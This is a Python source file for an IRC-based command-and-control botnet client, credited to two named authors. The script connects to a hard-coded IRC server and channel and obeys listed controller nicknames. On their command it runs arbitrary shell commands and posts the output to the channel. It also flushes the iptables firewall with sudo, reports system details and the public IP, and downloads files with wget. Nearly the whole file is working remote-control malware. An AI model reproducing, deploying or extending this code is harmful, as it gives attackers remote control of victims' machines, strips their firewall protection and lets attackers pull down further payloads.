#!/usr/bin/python
#IRC-based CNC Botnet
#Authors: Luke Matarazzo and Jackson Sadowski
#Blizzo

#to do list
#make more cross-platform instead of just for linux
#handle reconnecting if server restarts or there is some connection error

import socket
import ftplib
import urllib2
import urllib
import sys
import ctypes
import random
import time
import platform
import os
import subprocess as sub
from sys import argv
from random import randint

def generateNick(os): #generates a nick for the server
	rannum = str(randint(0, 9999))
	return str(os[:3] + rannum)

def execute(cmd): #execute shell commands
	#handling a multi-word command
	cmdList = []
	if (cmd.find(" ") != -1):
		cmdList = cmd.split(" ")
		p = sub.Popen(cmdList,stdout=sub.PIPE,stderr=sub.PIPE)
		output, errors = p.communicate()

	#handles a 1-liner
	else:
		p = sub.Popen(cmd,stdout=sub.PIPE,stderr=sub.PIPE)
		output, errors = p.communicate()

	#handling multi-line output
	lines = []
	temp = ""
	for letter in output:
		if (letter == '\n'):
			lines.append(temp)
			temp = ""
		else:
			temp = temp + letter

	#return one element if just a one-liner
	if (len(lines) == 1):
		return lines[0]
	#return the whole list
	else:
		return lines

#actually sending the data
def sendData(data): #send text back to the irc server
	#sending multiple lines if it's a list
	if type(data) is list:
		for line in data:
			irc.send('PRIVMSG ' + channel + " :" + line + '\r\n')
	#sending a one-liner back
	else:
		irc.send('PRIVMSG ' + channel + " :" + data + '\r\n')

#All of the possible functions that the botnet is capable of
def reply(): #send back to IRC server that you are here
	sendData("Yes I am here")

def whoAmI(): #execute whoami command and send output
	output  = execute("whoami")
	sendData(output)

def iAmGood(): #send back to IRC server that you are good
	sendData("I am good. And you?")

def runAndSend(cmd): #take a single command, run it, return output
	request = execute(cmd)
	sendData(request)

def getAge(): #send uptime
	sendData("I don't know how to do that yet boss.")

def terminate(): #terminate program and send goodbye message
	sendData("Oh no! We better find some cover.")
	exit()

def freeSpace(): #tells how much free space there is
	request = execute("df")
	sendData(request)

def uptime(): #total uptime on the server
	request = execute("uptime")
	sendData(request)

def version(): #which kernel version
	sendData(platform.release())

def getIP(): #gets the public IP address
	my_ip = urllib2.urlopen('http://ip.42.pl/raw').read()
	sendData(my_ip)

def flushFirewall(): #flushes the firewall rules
	os = platform.system().lower()
	if (os == "linux"):
		request = execute("sudo iptables -F")#flushing rules
		sendData("Firewall rules have been flushed.")

def checkFirewall(): #reports current firewall config
	os = platform.system().lower()
	if (os == "linux"):
		sendData("Current Firewall Rules:")
		request = execute("sudo iptables -L -n")
		sendData(request)

def download(cmd): #file downloader
	os = platform.system().lower()
	if (os == "linux"):
		if (cmd.count(" ") != 1):#make sure there is only 1 space
			sendData("Usage: download [file] [dir]")
		else:
			args = cmd.split(" ")
			download = "wget -q -P " + args[1] + " " + args[0]
			
			request = execute(download)#executing the download
			sendData("Download executed.")


#debugger
DEBUG = 0
if len(argv) > 1 and (argv[1] == "-d" or argv[1] == "--debug"):
	DEBUG = 1

#other vars
os = platform.system().lower()
INTERACT = [0, 1] 	#index one is the boolean for if the interactive shell is taking place for any bot
					#index two is the boolean for if the interactive shell is with this bot

#IRC Settings
admins = ["king", "samorizu", "blackbear", "bigshebang"]
server = "leagueachieve.info"
port = 6667
channel = "#lobby"
nick = generateNick(os)

print "The botnick is:", nick

#dictionary of functions
commands = {
	"are you there" : reply,
	"how are you" : iAmGood,
	"who are you" : whoAmI,
	"how old are you" : getAge,
	"zombie apocalypse" : terminate,
	"execute" : runAndSend,
	"free" : freeSpace,
	"uptime" : uptime,
	"version" : version,
	"what is your ip" : getIP,
	"flush firewall" : flushFirewall,
	"firewall" : checkFirewall,
	"download" : download
}

#function which parses the command and determines how to handle it
def parseCommand(command):
	if DEBUG:
		print "command is '%s'" % command
		print "interact 0: " + str(not INTERACT[0])
		print "interact 1: " + str(not INTERACT[1])

	if INTERACT[1] and "PRIVMSG" in command: #check if we should respond or not and if we find privmsg, we're good!
		lines = command.split("\n")
		if len(lines) > 2:
			print "we got a bunch of lines...doing nothing"
			return

		header = command[:command.index("PRIVMSG")] #get everything before PRIVMSG
		if ":" in header: #check if there is a colon first, to avoid crashing
			header = header[(header.index(":") + 1):] #get all after colon

		user = header[:header.index("!~")] #user sending message
		host = header[(header.index("!~") + 2):header.index(" ")] #hostname and ip/domain name: 'blarg@1.2.3.4'
		hostname = host[:host.index("@")] #hostname: 'blarg'
		client = host[(host.index("@") + 1):] #client/ip/domain name: '1.2.3.4' or 'blarg.com'

		if DEBUG:
			print "user is '%s'" % user
			print "host is '%s'" % host
			print "hostname is '%s'" % hostname
			print "client is '%s'" % client

		if user in admins: #check if sender is an approved controller
			tempCommand = command[command.index("PRIVMSG"):]
			command = tempCommand[(tempCommand.index(':') + 1):].strip().lower()

			print "Recieved %s from the CNC" % command #print command

			if INTERACT[0]: #if interactive shell is on
				if "??finish" == command[:8]:
					INTERACT[0] = 0
					return
				elif "??-" == command[:3]:
					users = command[3:].split(" ")
					if nick in users or "all" in users:
						INTERACT[1] = 0

					return
				elif "??+" == command[:3]:
					return

				if len(command) > 0:
					sendData("I would have performed: '" + command + "'")
			elif "??" == command[:2]: #if '??' is given
				INTERACT[0] = 1
				users = command[2:].split(" ")

				if DEBUG:
					print "command is '%s'" % command
				for user in users:
					print "user is '%s'" % user

				if not nick in users and not "all" in users:
					INTERACT[1] = 0
					return
			elif "?!" == command[:2]: #if they want to single out one or more bots to run a function
				if ":" in command:
					lines = command[2:].split(":")
				else:
					print "incorrect syntax. you need a ':'"
					return

				users = lines[0].split(" ")
				if nick in users or "all" in users:
					lines[1] = lines[1].strip()
					if lines[1] in commands.keys(): #if regular command
						commands[lines[1]]() #call appropriate function
						print "function called"
			else:
				if command in commands.keys(): #if regular command
					commands[command]() #call appropriate function
					print "function called"
				elif command[:7] == "execute": #if they want the execute command, make that work
					runAndSend(command[8:])
				elif command[:8] == "download":
					download(command[9:])
				else: #if not recognized
					print "command '%s' not defined" % command
		else:
			print "user '%s' not in list of admins" % user

	else: #we should not be listening, so we'll wait for '??stop' to end interactive shell
		if "PRIVMSG" in command:
			command = command[command.index("PRIVMSG"):]
			command = command[(command.index(':') + 1):].strip().lower()
			if "??finish" == command[:8]:
				INTERACT[0] = 0
				INTERACT[1] = 1
			elif "??+" == command[:3]:
				users = command[3:].split(" ")
				if nick in users or "all" in users:
					INTERACT[1] = 1


#Connecting to the IRC Server
irc = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #creates socket
print "connecting to: "+server
irc.connect((server, port)) #connects to the server
irc.send("USER "+ nick +" "+ nick +" "+ nick +" :This is a fun bot!\n") #user authentication
irc.send("NICK "+ nick +"\n") #sets nick

temp=irc.recv(1024) #get response to setting nick
if DEBUG:
	print "text received: '%s'" % temp

counter = 2
while "nickname already in use" in temp.lower():
	nick = nick + "-" + str(counter)
	if len(nick) > 9: #if nick gets too long, generate new number and reset counter; try again
		nick = generateNick(os)
		counter = 2
	irc.send("NICK " + nick + "\n") #sets nick
	temp=irc.recv(1024) #get response to setting nick
	if DEBUG:
		print "text received: '%s'\niteration %d" % (temp, counter)
	counter += 1

irc.send("PRIVMSG nickserv :iNOOPE\r\n") #auth
irc.send("JOIN "+ channel +"\n") #join the channel

#infinite loop to listen for messages aka commands
while 1:
	text=irc.recv(1024)  #receive up to 1024 bytes

	#The two lines below are required by the IRC RFC, if you remove them the bot will time out.
	if text.find('PING') != -1: #check if 'PING' is found
		irc.send('PONG ' + text.split() [1] + '\r\n') #returns 'PONG' back to the server to prevent pinging out

	parseCommand(text) #call function to parse commands
